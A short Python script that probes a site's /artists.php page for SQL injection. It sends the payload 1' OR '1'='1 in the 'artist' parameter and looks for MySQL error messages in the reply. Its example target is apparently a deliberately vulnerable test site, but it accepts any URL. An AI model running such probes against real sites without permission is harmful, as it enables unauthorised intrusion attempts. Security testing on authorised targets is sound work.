import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def test_sqli(base_url):
    # Define the endpoint with a known parameter
    path = "/artists.php"
    params = {"artist": "1' OR '1'='1"}

    # Build full test URL
    test_url = f"{base_url.rstrip('/')}{path}?" + urlencode(params)

    headers = {
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        print(f"🔍 Testing: {test_url}")
        r = requests.get(test_url, headers=headers, timeout=10)

        if "mysql" in r.text.lower() or "syntax error" in r.text.lower() or "you have an error in your sql" in r.text.lower():
            print("🚨 Vulnerable to SQL Injection!")
        else:
            print("✅ Not vulnerable (based on this test).")
    except Exception as e:
        print("❌ Error:", e)

# Just enter base domain only
url = input("Enter base site URL (e.g., http://testphp.vulnweb.com): ")
test_sqli(url)
